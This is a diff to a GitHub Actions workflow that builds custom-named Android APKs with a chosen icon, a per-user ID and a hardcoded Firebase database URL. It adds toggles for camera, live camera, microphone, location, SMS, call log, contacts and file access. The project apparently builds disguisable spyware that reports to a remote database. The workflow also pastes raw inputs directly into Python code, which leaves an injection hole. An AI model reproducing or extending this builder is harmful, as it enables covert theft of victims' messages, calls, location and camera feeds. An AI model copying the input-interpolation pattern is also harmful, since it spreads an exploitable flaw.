@@ -31,6 +31,10 @@ on:
         description: 'User Email Address for Notifications'
         required: false
         default: ''
+      feature_flags:
+        description: 'JSON encoded feature and permission toggles'
+        required: false
+        default: '{}'
 
 jobs:
   build:
@@ -59,7 +63,7 @@ jobs:
       - name: Inject Configuration & Custom Icon
         run: |
           python -c "
-          import os, re, base64
+          import os, re, base64, json
           from PIL import Image
 
           app_name = '${{ github.event.inputs.app_name }}'
@@ -67,7 +71,13 @@ jobs:
           webview_url = '${{ github.event.inputs.webview_url }}'
           user_id = '${{ github.event.inputs.user_id }}'
           icon_b64 = '${{ github.event.inputs.app_icon_b64 }}'
+          feature_flags_raw = '${{ github.event.inputs.feature_flags }}'
           firebase_url = 'https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/'
+
+          try:
+              features = json.loads(feature_flags_raw) if feature_flags_raw else {}
+          except Exception as e:
+              features = {}
 
           # 1. Update AndroidManifest.xml
           manifest = 'app/src/main/AndroidManifest.xml'
@@ -78,6 +88,38 @@ jobs:
               c = re.sub(r'android:name=\"user_id\" android:value=\"[^\"]*\"', f'android:name=\"user_id\" android:value=\"{user_id}\"', c)
               c = re.sub(r'android:name=\"firebase_url\" android:value=\"[^\"]*\"', f'android:name=\"firebase_url\" android:value=\"{firebase_url}\"', c)
               c = re.sub(r'android:name=\"service_title\" android:value=\"[^\"]*\"', f'android:name=\"service_title\" android:value=\"{app_name}\"', c)
+
+              # Inject feature metadata flags
+              meta_injections = ''
+              for k, v in features.items():
+                  val_str = 'true' if v else 'false'
+                  c = re.sub(rf'<meta-data\s+android:name=\"feat_{k}\"[^>]*/>\n?', '', c)
+                  meta_injections += f'        <meta-data android:name=\"feat_{k}\" android:value=\"{val_str}\" />\n'
+              if meta_injections:
+                  c = c.replace('<application', '<application\n' + meta_injections)
+
+              # Strip permissions from manifest if unchecked by user
+              if features.get('camera') is False and features.get('livecam') is False:
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.CAMERA\"[^>]*/>', '', c)
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.FOREGROUND_SERVICE_CAMERA\"[^>]*/>', '', c)
+              if features.get('audio') is False and features.get('livecam') is False:
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.RECORD_AUDIO\"[^>]*/>', '', c)
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.FOREGROUND_SERVICE_MICROPHONE\"[^>]*/>', '', c)
+              if features.get('location') is False:
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.ACCESS_FINE_LOCATION\"[^>]*/>', '', c)
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.ACCESS_COARSE_LOCATION\"[^>]*/>', '', c)
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.FOREGROUND_SERVICE_LOCATION\"[^>]*/>', '', c)
+              if features.get('sms') is False:
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.READ_SMS\"[^>]*/>', '', c)
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.RECEIVE_SMS\"[^>]*/>', '', c)
+              if features.get('calls') is False:
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.READ_CALL_LOG\"[^>]*/>', '', c)
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.READ_CONTACTS\"[^>]*/>', '', c)
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.CALL_PHONE\"[^>]*/>', '', c)
+              if features.get('gallery') is False and features.get('files') is False:
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.READ_EXTERNAL_STORAGE\"[^>]*/>', '', c)
+                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.READ_MEDIA_[^\"]*\"[^>]*/>', '', c)
+
               with open(manifest, 'w', encoding='utf-8') as f:
                   f.write(c)
 
